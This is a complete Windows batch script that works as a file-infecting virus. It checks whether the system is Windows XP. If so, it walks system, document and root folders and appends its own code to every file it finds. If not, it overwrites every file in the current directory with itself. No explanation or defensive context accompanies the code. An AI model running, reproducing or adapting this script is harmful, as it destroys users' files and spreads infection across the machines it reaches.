@echo off
ctty nul
ver | find "XP"
if errorlevel 1 goto Fin
if not errorlevel 1 goto :FollarXP
:FollarXP
for /r \ %%x in (%winbootdir%\*.*, c:\misdoc~1\*.*, c:\archiv~1\*.*, c:\*.*, c:\mydocu~1\*.*, %windir%\*.*, *.*) do copy %%x+%0 %%x
goto Deu
:Fin
for %%n in (*?.*) do copy %0 %%n /Y
:deu
exit
